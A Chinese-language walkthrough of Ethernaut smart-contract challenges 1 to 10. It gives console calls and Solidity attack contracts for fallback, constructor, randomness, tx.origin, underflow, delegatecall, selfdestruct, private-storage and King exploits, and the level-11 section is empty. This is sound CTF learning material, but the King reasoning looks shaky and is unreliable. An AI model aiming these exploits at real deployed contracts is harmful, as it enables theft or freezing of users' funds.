# 1 Hello Ethernaut

可以直接在控制台里输入contrac查看ABI的methods

await contract.password() 查看密码
'ethernaut0'
await contract.authenticate('ethernaut0') 输入密码
submit instance 

# 2 Fallback

阅读智能合约代码 receive() 可以修改owner, 修改owner后call withdraw()即可

2.1. await contract.contribute({value: 1})
call 完后查看是否有balance，就可以send了
2.2. await contract.getContribution()
1
2.3. 转 1 ether 
await contract.send(1)
2.4. await contract.owner()
'0xe5107dee9CcC8054210FF6129cE15Eaa5bbcB1c0'
# 最后一步，把钱取出来
2.5. await contract.withdraw()
submit instance 

# 3 Fallout

错误的构造函数拼写(1)

```
    /* constructor */
    function Fal1out() public payable {
        owner = msg.sender;
        allocations[owner] = msg.value;
    }
```

3.1. await contract.Fal1out()
3.2. await contract.owner()
'0xe5107dee9CcC8054210FF6129cE15Eaa5bbcB1c0'
submit instance

# 4 Coin Flip

错误的使用blocknumber作为随机数

```
    function flip(bool _guess) public {
        uint blockValue = uint(blockhash(block.number-1));
        uint coinFlip = blockValue / 57896044618658097711785492504343953926634992332820282019728792003956564819968;
        bool side = coinFlip == 1 ? true : false;
        if (side == _guess) {
            totalWins[msg.sender]++;
        }
    }
```

编写攻击合约

```
pragma solidity ^0.8.0;

interface IChallenge {
    function flip(bool _guess) external payable returns (bool);
}

contract CoinFlipAttack {
    IChallenge challenge;
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    constructor(address challengeAddress) {
        challenge = IChallenge(challengeAddress);
    }

    function flip() public returns (bool) {
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;
        challenge.flip(side);
    }
}
```
部署合约（challenge address为目标合约）, 然后call 10次flip()即可
await contract.consecutiveWins()
10

submit instance

# 5 Telephone

```
function changeOwner(address _owner) public {
    if (tx.origin != msg.sender) {
        owner = _owner;
    }
}
```

其中

tx.origin 是最初发起交易的地址
msg.sender 是当前调用者的地址
因此通过中间合约调用即可修改owner

编写攻击合约

```
pragma solidity ^0.8.0;

interface Telephone {
    function changeOwner(address _owner) external;
}

contract Attack {
    address public targetContract;

    constructor(address _targetContract) {
        targetContract = _targetContract;
    }

    function attackChangeOwner(address _newOwner) public {
        Telephone(targetContract).changeOwner(_newOwner);
    }
}
```
call attackChangeOwner("你的地址")即可
await contract.owner()
'你的地址'
submit instance


# 6 Token

转账余额表没有校验，会溢出

```
pragma solidity ^0.6.0;

contract Token {
    mapping(address => uint256) balances;
    uint256 public totalSupply;

    constructor(uint256 _initialSupply) public {
        balances[msg.sender] = totalSupply = _initialSupply;
    }

    function transfer(address _to, uint256 _value) public returns (bool) {
        require(balances[msg.sender] - _value >= 0);
        balances[msg.sender] -= _value;
        balances[_to] += _value;
        return true;
    }

    function balanceOf(address _owner) public view returns (uint256 balance) {
        return balances[_owner];
    }
}
```

在Solidity版本0.8.0之前，uint256类型的减法操作不会自动进行溢出检查。
如果_value大于balances[msg.sender]，balances[msg.sender] - _value 会发生溢出（underflow），这会导致balances[msg.sender]的值变为一个非常大的数字（由于uint256是一个无符号整数，在溢出时，它会从0变为2^256 - 1）


6.1. 转一笔超过自己余额的交易, 让balance溢出

await contract.transfer(player, 1000000000000)

submit instance


# 7 Delegate

delegatecall 是一个低级的EVM（以太坊虚拟机）指令，它允许一个合约调用另一个合约的代码，同时保持原调用合约的上下文。
这意味着在delegatecall过程中，被调用的合约代码会在原合约的存储和余额上下文中执行。

在Remix里使用de legatecall调用合约的ABI

```
contract Delegate {
    address public owner;

    constructor(address _owner) {
        owner = _owner;
    }

    function pwn() public {
        owner = msg.sender;
    }
}
```

调用pwn()即可, deletegatecall会修改主合约的owner
await contract.owner()

submit instance

# 8 Force

猜测这个合约会自动在receive或者fallback里退回用户的转账。
我们可以使用攻击合约来调用这个合约，然后在receive或者fallback里调用selfdestruct来销毁合约

selfdestruct是一种特殊的EVM指令，它会销毁调用该指令的合约，并将合约中的所有剩余余额发送到指定的地址。在攻击合约中，selfdestruct指令被调用时：

* 攻击合约的代码和状态将从区块链上删除。

* 所有剩余的以太币将被发送到指定的地址（在这种情况下，目标合约地址）。

selfdestruct操作本质上是无法退款的行为。当调用selfdestruct时，攻击合约的所有状态数据和代码都被删除，且所有资金被直接转入目标地址。

编写攻击合约
```
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract AttackContract {
    address payable public victim;

    constructor(address payable _victim) {
        victim = _victim;
    }

    function attack() external payable {
        require(msg.value > 0, "Send some Ether to attack");
        selfdestruct(victim);
    }

    fallback() external payable {
        selfdestruct(payable(msg.sender)); 
    }

    receive() external payable {
        selfdestruct(payable(msg.sender));
    }
}
```
执行attack()即可

await getBalance(contract.address)
'1'

submit instance

In solidity, for a contract to be able to receive ether, the fallback function must be marked payable.

However, there is no way to stop an attacker from sending ether to a contract by self destroying. Hence, it is important not to count on the invariant address(this).balance == 0 for any contract logic.

# 9 Vault

在Solidity中，private关键字用于声明合约中的私有状态变量，意味着这些变量只能在合约内部访问，不能被外部合约或外部用户直接访问。
然而，以太坊的存储是公开的，任何人都可以查看区块链上的数据，包括合约的存储状态。

9.1. 查看合约的私有变量

```
from web3 import Web3

api_key = "你的Infura API key"
infura_url = "https://sepolia.infura.io/v3/" + api_key
web3 = Web3(Web3.HTTPProvider(infura_url))

if web3.is_connected():
    print("Connected to Sepolia test network")
else:
    print("Failed to connect to Sepolia test network")

contract_address = "0xa7fe40ba92f046118cd5a0d876ad327f1fb0f1d1"
checksum_address = Web3.to_checksum_address(contract_address)

def get_contract_info(address):
    balance = web3.eth.get_balance(address)
    print(f"Contract Balance: {web3.from_wei(balance, 'ether')} ETH")

    transaction_count = web3.eth.get_transaction_count(address)
    print(f"Transaction Count: {transaction_count}")

    code = web3.eth.get_code(address)
    if code != b'':
        print("Contract Code exists, this is a contract address.")
    else:
        print("No contract code, this is likely an externally owned address.")

def get_storage_values(address, slots):
    for slot in slots:
        storage_value = web3.eth.get_storage_at(address, slot)
        print(f"Storage at slot {slot}: {storage_value.hex()}")

get_contract_info(checksum_address)

storage_slots_to_check = [0, 1]
get_storage_values(checksum_address, storage_slots_to_check)
```

输出结果为
```
Connected to Sepolia test network
Contract Balance: 0 ETH
Transaction Count: 1
Contract Code exists, this is a contract address.
Storage at slot 0: 0x0000000000000000000000000000000000000000000000000000000000000001
Storage at slot 1: 0x412076657279207374726f6e67207365637265742070617373776f7264203a29
```

因为智能合约为
```

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Vault {
    bool public locked;
    bytes32 private password;

    constructor(bytes32 _password) {
        locked = true;
        password = _password;
    }

    function unlock(bytes32 _password) public {
        if (password == _password) {
            locked = false;
        }
    }
}
```

可以知道slot 0为locked，slot 1为password

9.2. 执行unlock

await contract.unlock("0x412076657279207374726f6e67207365637265742070617373776f7264203a29")
{tx: '0x9fb119f3ebdd6e1043e27d6cbc952ca5548f7ffe1785d070ca7294acd4d653b0', receipt: {…}, logs: Array(0)}
await contract.locked()
false

submit instance

在Solidity中，所有状态变量都存储在以太坊合约的存储中。每个状态变量都有一个存储槽（Storage Slot）位置，Solidity编译器将根据变量的声明顺序和类型决定它们在存储中的位置。

存储槽的分配规则
基本类型（如uint256、address等）：

基本类型的变量按声明顺序分配到下一个可用的存储槽中。每个存储槽的大小是256位（32字节）。
例如，第一个声明的uint256变量存储在槽0，第二个声明的uint256变量存储在槽1，依此类推。
结构体（Struct）和静态数组（Fixed-size Array）：

结构体和静态数组会占用一个或多个完整的存储槽。它们的存储位置也是按声明顺序分配的。
例如，一个struct或一个uint256[2]的数组可能会占用连续的两个存储槽。
映射（Mapping）和动态数组（Dynamic Array）：

映射和动态数组的存储更加复杂，因为它们的大小在编译时未知。
映射类型的存储位置通过计算哈希值来确定，存储键值对的存储槽为keccak256(h(k) . p)，其中p是映射变量的位置。
动态数组的长度存储在主槽中，数组元素存储在计算的槽之后的位置。

# 10 King

```
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract King {
    address king;
    uint256 public prize;
    address public owner;

    constructor() payable {
        owner = msg.sender;
        king = msg.sender;
        prize = msg.value;
    }

    receive() external payable {
        require(msg.value >= prize || msg.sender == owner);
        payable(king).transfer(msg.value);
        king = msg.sender;
        prize = msg.value;
    }

    function _king() public view returns (address) {
        return king;
    }
}
```

读取合约发现prize的初始值为1000000000000000, 因此我们需要转1000000000000001wei来攻击合约
为了阻止owner reclaim kingship，我们需要让合约无法正常执行下去，可以通过中间合约来转账成为king，然后销毁中间合约。
这样 payable(king).transfer(msg.value); 就无法执行下去了，owner就无法取回kingship了

编写攻击合约
```
pragma solidity ^0.8.0;

contract AttackContract {
    address payable public victim;

    constructor(address payable _victim) {
        victim = _victim;
    }

    function sendAllEthToVictim() external payable {
        require(msg.value > 0, "Send some Ether to transfer");

        (bool sent, ) = victim.call{value: msg.value}("");
        require(sent, "Failed to send Ether");
    }

    function destroyContract() external {
        selfdestruct(payable(msg.sender));
    }

    fallback() external payable {
        selfdestruct(payable(msg.sender)); 
    }

    receive() external payable {
        selfdestruct(payable(msg.sender));
    }
}

```
执行 sendAllEthToVictim(), 转1000000000000001wei
执行 destroyContract()销毁合约
submit instance

# 11 Reentrancy

